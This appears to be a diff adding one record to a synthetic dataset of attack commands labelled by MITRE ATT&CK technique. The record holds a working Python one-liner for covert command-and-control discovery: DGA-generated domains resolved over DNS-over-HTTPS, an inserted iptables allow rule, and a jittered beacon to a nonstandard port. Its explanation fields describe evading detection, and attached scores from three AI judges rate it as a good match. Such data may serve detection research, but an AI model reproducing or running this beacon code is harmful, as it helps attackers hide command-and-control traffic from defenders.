@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import json,random,datetime,hashlib,subprocess,time; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='doh-rotate'; tlds=['net','com','xyz']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha1((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndoh_endpoints=['https://cloudflare-dns.com/dns-query','https://dns.google/resolve']\nport=random.choice([2053,9444,8843])\nfor d in dga(18)[:6]:\n    doh=random.choice(doh_endpoints)\n    url=(doh+'?name='+d+'&type=A') if 'resolve' in doh else (doh+'?name='+d+'&type=A')\n    try:\n        j=subprocess.check_output(['curl','-s','-H','accept: application/dns-json',url],timeout=4)\n        ans=json.loads(j).get('Answer',[])\n        ip=next((a.get('data') for a in ans if a.get('type')==1),None)\n        if ip:\n            subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n            time.sleep(random.uniform(0.5,1.7))\n            subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{d}:{port}:{ip}',f'https://{d}:{port}/beacon','-k'])\n            print(d,ip,port)\n            break\n    except Exception:\n        continue\"",
+  "explanation": "Randomizes DoH resolvers and DGA domains, adding jitter and a nonstandard port to evade pattern-based detection during dynamic C2 discovery.",
+  "rationale_steps": [
+    "Generate candidate DGA domains and randomly pick DoH endpoints.",
+    "Resolve A records via DoH to reduce exposure to local DNS logging.",
+    "Insert precise iptables allow rules to uncommon ports.",
+    "Beacon with jittered timing to avoid regular traffic signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-9b1f2283",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is well-formed with properly balanced quotes, parentheses, and braces, correct imports, valid function definitions, and proper exception handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a DGA algorithm with date-based seeding, DNS over HTTPS for resolution, randomized endpoints, jitter timing, and establishing C2 connections to dynamically resolved domains.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:08:35.320603Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly well-formed with balanced syntax, valid constructs, and correct function/method calls.",
+        "semantic_score": 4,
+        "semantic_justification": "The command strongly aligns with T1568 by implementing DGA, DoH-based dynamic resolution, randomized beaconing to nonstandard ports with jitter, and an attempt to configure firewall rules, though the `iptables` call requires elevated privileges not stated.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T06:08:50.968034Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed python -c with balanced quoting, valid curl/iptables flags, and correct Python syntax across newlines.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements DGA-based domain generation, randomized DoH resolution, endpoint/port rotation, jitter, and a beacon attempt via --resolve consistent with T1568, but includes an unused scapy import that may raise ImportError and an iptables step requiring root.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:09:24.834938Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
